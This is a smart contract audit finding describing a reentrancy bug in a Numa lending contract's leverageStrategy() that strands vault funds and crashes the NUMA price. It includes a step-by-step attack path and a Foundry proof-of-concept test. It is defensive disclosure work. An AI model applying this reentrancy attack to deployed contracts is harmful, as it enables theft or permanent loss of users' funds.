# CNumaToken.leverageStrategy() can be re-entered, causing all the vault funds to be moved to a cToken, crashing NUMA price.

### Summary

[`CNumaToken.leverageStrategy()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/lending/CNumaToken.sol#L141) has a `_collateral` token parameter which allows an attacker to pass in a custom `_collateral` token, which acts as a wrapper around the actual collateral token, while also receiving callbacks to enable reentrancy. 

This allows the flash loan repayment to be avoided, causing a large chunk of the vault's fund to be stuck in the cNuma contract, severely dumping the NUMA price.

### Root Cause

Allowing the user to pass in the `_collateral` token enables reentrancy, allowing them to call `leverageStrategy()` again. Then when `repayLeverage()` is called in the reentrant call, the `leverageDebt` in the vault is set to `0`, even though the first call still has not repaid it's leverageDebt.

### Attack Path

This exact attack is shown in the PoC. It involves a specially crafted `FakeCollateral` contract which is a wrapper around the underlying collateral, which ensures that the attack does not revert.

1. Attacker calls `cNuma.leverageStrategy()`, with `_collateral=FakeCollateral`, and a large `_borrowAmount`
2. The FakeCollateral contract re-enters the `cNuma` contract, calling `leverageStrategy()` again, with a small `_borrowAmount`
3. The reentrant call to `leverageStrategy()` finishes by calling `vault.repayLeverage()` which sets `leverageDebt` to `0`.
4. Since `leverageDebt` is equal to `0`, when it comes time for the initial `leverageStrategy()'s borrow to be repaid, none will be repaid. This causes the entire borrowed funds to be stuck in cNuma.

### Impact

Large amounts of LST can be pulled from the vault into the `CNuma` contract. This dumps the NUMA price since it depends on the ETH balance of the vault. These LSTs will be permanently lost and stuck.

### PoC

The PoC demonstrates moving 10% of the vault's funds into the cNuma contract where it can't be retrieved.

Add the foundry test to `Lending.t.sol`
```solidity
function test_reentrancy_leverageStrategy() public {
        vm.startPrank(userA);
        address[] memory t = new address[](2);
        t[0] = address(cReth);
        t[1] = address(cNuma);
        comptroller.enterMarkets(t);

        // mint cNuma so that we can borrow numa later
        uint depositAmount = 9e24;
        numa.approve(address(cNuma), depositAmount);
        cNuma.mint(depositAmount);

        // To be used as collateral to borrow NUMA
        deal(address(rEth), userA, 1e24 + providedAmount);
        rEth.approve(address(cReth), 1e24);
        cReth.mint(1e24);

        uint256 vaultRethBefore = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma = rEth.balanceOf(address(cNuma));

        rEth.approve(address(cNuma), providedAmount);

        // Setting up fake collateral token (which interacts with rETH)
        FakeCollateral fake_cReth = new FakeCollateral(address(cReth), address(rEth), userA, comptroller);

        // Sending it a tiny amount of cReth, so it can re-enter cNuma.leverageStrategy()
        cReth.transfer(address(fake_cReth), 5e10 / 2);

        // call strategy
        uint256 borrowAmount = 1e24;

        uint strategyindex = 0;
        cNuma.leverageStrategy(
            providedAmount,
            borrowAmount,
            CNumaToken(address(fake_cReth)),
            strategyindex
        );

        // check balances
        // cnuma position
        uint256 vaultRethAfter = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma_After = rEth.balanceOf(address(cNuma));
        
        // Shows that the rETH balance of the cNuma token contract has gone up by `borrowAmount` (since flash loan was not repaid)
        console.log("cNUMA rETH balance: %e->%e (stuck funds)", reth_in_cNuma, reth_in_cNuma_After);
        assertEq(reth_in_cNuma_After - reth_in_cNuma, borrowAmount);
    }
```

Also add the following attack contract to a new file `FakeCollateral.sol` in the same directory as `Lending.t.sol`
